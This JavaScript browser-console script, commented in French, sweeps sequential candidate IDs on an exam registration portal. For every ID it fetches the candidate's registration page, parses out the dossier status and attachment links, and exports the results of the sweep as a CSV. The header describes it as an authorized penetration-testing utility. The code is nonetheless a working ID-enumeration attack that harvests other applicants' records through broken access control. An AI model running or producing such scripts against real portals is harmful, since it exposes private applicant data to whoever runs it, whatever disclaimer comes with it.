/**
 * compter-dossiers-en-traitement.js
 *
 * Authorized security-testing utility: reuses the same matricule sweep as
 * verify-matricules-filieres.js against the exam registration portal, but
 * instead of archiving each fiche, it checks — for every dossier that
 * exists — whether it is *actually* "en cours de traitement" or only
 * displayed as such while missing the pièces jointes (attachments)
 * required for real processing.
 *
 * A dossier is counted as "réellement en cours de traitement" only when
 * BOTH are true:
 *   - the status label on the page matches "en cours de traitement"
 *   - at least one attachment (pièce jointe) link is present on the page
 *
 * Dossiers that show the "en cours de traitement" status but have zero
 * attachments are reported separately, since they are not genuinely being
 * processed.
 *
 * Usage: run in the browser DevTools console while on the target origin,
 * inside the scope of an authorized penetration test / bug bounty
 * engagement only. Do not run against systems you do not have explicit
 * written authorization to test, and only collect the volume of evidence
 * agreed in the engagement's rules of engagement.
 *
 * Adjust `debut`, `fin`, and the matricule prefix/format below to match
 * the engagement's agreed test range (kept in sync with
 * verify-matricules-filieres.js).
 */
(async () => {
    const debut = 1;
    const fin = 150;
    const resultat = [];

    // Libellés de statut recherchés sur la fiche du candidat
    const libelleStatutRegex = /statut|[ée]tat\s*du\s*dossier|situation\s*du\s*dossier/i;
    const enCoursDeTraitementRegex = /en\s*cours\s*de\s*traitement/i;

    // Libellé indiquant explicitement l'absence de pièce jointe
    const aucunePieceJointeRegex = /aucun(e)?\s*(pi[èe]ce\s*jointe|document|fichier)/i;

    // Section "pièces jointes" sur la fiche
    const libellePiecesJointesRegex = /pi[èe]ces?\s*jointes?|documents?\s*(joints?|transmis)/i;

    // Extensions de fichiers typiquement utilisées pour les pièces jointes
    // uploadées par le candidat (par opposition aux assets statiques du site)
    const extensionPieceJointeRegex = /\.(pdf|jpe?g|png|gif|bmp|tiff?|docx?|xlsx?)(\?|#|$)/i;

    function extraireStatut(doc) {
        const elements = [...doc.querySelectorAll("input, select, textarea, td, th, label, p, span, div, strong, b")];

        for (const element of elements) {
            const texte = element.textContent.trim();

            if (libelleStatutRegex.test(texte) && texte.length < 200) {
                const valeur =
                    element.value ||
                    element.nextElementSibling?.textContent?.trim() ||
                    texte;

                if (valeur && valeur.length > 1) {
                    return valeur.replace(/\s+/g, " ").trim();
                }
            }
        }

        return "";
    }

    // Compte les liens vers des pièces jointes réellement uploadées : soit
    // situés dans une zone étiquetée "pièces jointes"/"documents", soit
    // pointant vers un fichier avec une extension de document/image.
    function compterPiecesJointes(doc) {
        const liens = [...doc.querySelectorAll("a[href]")];
        const vus = new Set();

        for (const lien of liens) {
            const href = lien.getAttribute("href");

            if (!href || href.startsWith("javascript:") || href === "#") {
                continue;
            }

            const dansZonePiecesJointes = (() => {
                let noeud = lien;
                for (let profondeur = 0; noeud && profondeur < 4; profondeur++, noeud = noeud.parentElement) {
                    if (libellePiecesJointesRegex.test(noeud.textContent || "")) {
                        return true;
                    }
                }
                return false;
            })();

            if (dansZonePiecesJointes || extensionPieceJointeRegex.test(href)) {
                vus.add(href);
            }
        }

        return vus.size;
    }

    function texteContient(doc, regex) {
        return regex.test(doc.body ? doc.body.textContent : "");
    }

    function telechargerBlob(blob, nomFichier) {
        const objectUrl = URL.createObjectURL(blob);
        const lien = document.createElement("a");
        lien.href = objectUrl;
        lien.download = nomFichier;

        document.body.appendChild(lien);
        lien.click();
        lien.remove();

        setTimeout(() => URL.revokeObjectURL(objectUrl), 2000);
    }

    function exporterCSV(donnees) {
        const lignes = [
            ["Matricule", "Existe", "Statut affiché", "Affiché en cours de traitement", "Pièces jointes", "Réellement en cours de traitement", "Lien"],
            ...donnees.map(x => [
                x.Matricule,
                x.Existe,
                x.Statut,
                x.AfficheEnCours,
                x.NombrePiecesJointes,
                x.ReellementEnCours,
                x.Lien
            ])
        ];

        const csv = "﻿" + lignes
            .map(ligne =>
                ligne.map(cellule =>
                    `"${String(cellule).replace(/"/g, '""')}"`
                ).join(";")
            )
            .join("\n");

        const debutTag = String(debut).padStart(5, "0");
        const finTag = String(fin).padStart(5, "0");

        telechargerBlob(
            new Blob([csv], { type: "text/csv;charset=utf-8;" }),
            `dossiers_en_traitement_26SP${debutTag}_a_26SP${finTag}.csv`
        );

        console.log("📁 Fichier CSV téléchargé (" + donnees.length + " lignes)");
    }

    console.log("🔎 Vérification des dossiers réellement en cours de traitement...");

    let dossiersExistants = 0;
    let afficheEnCoursCount = 0;
    let sansPieceJointeCount = 0;
    let reellementEnCoursCount = 0;

    try {
        for (let i = debut; i <= fin; i++) {
            const matricule = `26SP${String(i).padStart(5, "0")}`;
            const url = `/registration-display-submit/SP/${matricule}`;

            try {
                const response = await fetch(url);
                const html = await response.text();

                const existe =
                    response.ok &&
                    html.includes(matricule) &&
                    html.includes("Inscription au concours");

                let statut = "";
                let afficheEnCours = false;
                let nombrePiecesJointes = 0;
                let aucunePieceJointeExplicite = false;

                if (existe) {
                    dossiersExistants++;

                    const doc = new DOMParser().parseFromString(html, "text/html");

                    statut = extraireStatut(doc);
                    afficheEnCours = enCoursDeTraitementRegex.test(statut) || texteContient(doc, enCoursDeTraitementRegex);
                    nombrePiecesJointes = compterPiecesJointes(doc);
                    aucunePieceJointeExplicite = texteContient(doc, aucunePieceJointeRegex);

                    if (afficheEnCours) {
                        afficheEnCoursCount++;
                    }

                    if (nombrePiecesJointes === 0 || aucunePieceJointeExplicite) {
                        sansPieceJointeCount++;
                    }
                }

                const reellementEnCours =
                    existe &&
                    afficheEnCours &&
                    nombrePiecesJointes > 0 &&
                    !aucunePieceJointeExplicite;

                if (reellementEnCours) {
                    reellementEnCoursCount++;
                }

                resultat.push({
                    Matricule: matricule,
                    Existe: existe ? "OUI" : "NON",
                    Statut: statut,
                    AfficheEnCours: afficheEnCours ? "OUI" : "NON",
                    NombrePiecesJointes: nombrePiecesJointes,
                    ReellementEnCours: reellementEnCours ? "OUI" : "NON",
                    Lien: existe
                        ? new URL(url, window.location.origin).href
                        : ""
                });

                console.log(
                    `${i}/${fin} — ${matricule} → ${existe ? "✅" : "❌"} ` +
                    (existe ? `[${statut || "statut inconnu"}] pj=${nombrePiecesJointes} → ${reellementEnCours ? "✔️ en traitement" : "⚠️ incomplet/non applicable"}` : "")
                );

            } catch (erreur) {
                resultat.push({
                    Matricule: matricule,
                    Existe: "ERREUR",
                    Statut: "",
                    AfficheEnCours: "NON",
                    NombrePiecesJointes: 0,
                    ReellementEnCours: "NON",
                    Lien: ""
                });

                console.log(`${i}/${fin} — ${matricule} → ⚠️ ERREUR`);
            }

            await new Promise(resolve => setTimeout(resolve, 150));
        }
    } finally {
        exporterCSV(resultat);

        console.log("================================");
        console.log("✅ TERMINÉ");
        console.log(`📊 ${resultat.length} matricules vérifiés`);
        console.log(`📂 ${dossiersExistants} dossiers existants`);
        console.log(`🏷️ ${afficheEnCoursCount} affichent le statut "en cours de traitement"`);
        console.log(`📎 ${sansPieceJointeCount} dossiers sans pièce jointe chargée`);
        console.log(`✔️ ${reellementEnCoursCount} dossiers RÉELLEMENT en cours de traitement (statut + pièce(s) jointe(s))`);
        console.log("================================");

        console.table(resultat);
    }
})();
